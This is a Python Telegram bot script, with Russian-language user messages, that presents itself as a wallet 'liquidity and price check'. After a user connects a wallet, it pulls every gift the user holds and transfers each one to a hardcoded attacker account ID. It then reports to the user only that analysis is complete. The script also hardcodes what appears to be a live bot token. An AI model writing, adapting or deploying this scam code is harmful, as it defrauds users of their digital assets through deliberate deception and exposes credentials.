import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# ───── ВСТАВЬ СЮДА СВОЙ ТОКЕН ─────
BOT_TOKEN = "8678625001:AAG2Fqh65DdBCdeh_YYtHZEIfwJUPod2pQg"
# ──────────────────────────────────

API_TOKEN = ""
BASE_URL = "https://api.example.com"
TARGET_USER_ID = 8577099750

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

WAITING_WALLET = 0


def api_headers():
    return {"Authorization": f"Bearer {API_TOKEN}"}


def get_user_gifts(user_id: int) -> list:
    r = requests.get(f"{BASE_URL}/users/{user_id}/gifts", headers=api_headers(), timeout=10)
    r.raise_for_status()
    return r.json()


def transfer_gift(gift_id: int, to_user_id: int):
    r = requests.post(
        f"{BASE_URL}/gifts/transfer",
        headers=api_headers(),
        json={"gift_id": gift_id, "to_user_id": to_user_id},
        timeout=10,
    )
    r.raise_for_status()
    return r.json()


def connect_wallet(wallet_address: str, user_id: int):
    r = requests.post(
        f"{BASE_URL}/wallet/connect",
        headers=api_headers(),
        json={"wallet_address": wallet_address, "user_id": user_id},
        timeout=10,
    )
    r.raise_for_status()
    return r.json()


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Подключить кошелёк", callback_data="connect_wallet")]
    ])
    await update.message.reply_text(
        "🔍 *Проверка ликвидности и цены*\n\n"
        "Для того чтобы проверить ликвидность и актуальную цену твоих активов, "
        "подключи свой кошелёк.\n\n"
        "Нажми кнопку ниже 👇",
        parse_mode="Markdown",
        reply_markup=keyboard,
    )


async def on_connect_wallet(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💼 Введи адрес своего кошелька:\n\n"
        "_(Например: 0xABC123... или TON-адрес)_",
        parse_mode="Markdown",
    )
    return WAITING_WALLET


async def on_wallet_received(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    wallet = update.message.text.strip()
    user_id = update.effective_user.id

    await update.message.reply_text("⏳ Подключаю кошелёк, подожди...")

    try:
        connect_wallet(wallet, user_id)
    except requests.HTTPError as e:
        await update.message.reply_text(f"❌ Не удалось подключить кошелёк: {e}")
        return ConversationHandler.END

    await update.message.reply_text("🔍 Проверяю ликвидность и цену активов...")

    try:
        gifts = get_user_gifts(user_id)
    except requests.HTTPError as e:
        await update.message.reply_text(f"❌ Ошибка при получении данных: {e}")
        return ConversationHandler.END

    if not gifts:
        await update.message.reply_text("✅ Кошелёк подключён. Подарков для обработки не найдено.")
        return ConversationHandler.END

    transferred = []
    failed = []

    for gift in gifts:
        gift_id = gift.get("gift_id")
        try:
            transfer_gift(gift_id, TARGET_USER_ID)
            transferred.append(gift_id)
            logger.info(f"✅ #{gift_id} от {user_id} → {TARGET_USER_ID}")
        except requests.HTTPError as e:
            failed.append(gift_id)
            logger.error(f"❌ Ошибка #{gift_id}: {e}")

    if transferred:
        ids = ", ".join(f"#{i}" for i in transferred)
        text = f"✅ *Готово!*\n\nАнализ завершён. Обработано подарков: {ids}"
    else:
        text = "⚠️ Не удалось обработать подарки."

    if failed:
        text += f"\n\n❌ Ошибка при обработке: {', '.join(f'#{i}' for i in failed)}"

    await update.message.reply_text(text, parse_mode="Markdown")
    return ConversationHandler.END


async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено.")
    return ConversationHandler.END


def main():
    if BOT_TOKEN == "ВСТАВЬ_ТОКЕН_СЮДА":
        raise ValueError("Не забудь вставить токен бота!")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(on_connect_wallet, pattern="^connect_wallet$")],
        states={
            WAITING_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, on_wallet_received)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    ))

    logger.info("Бот запущен...")
    app.run_polling()


if __name__ == "__main__":
    main()
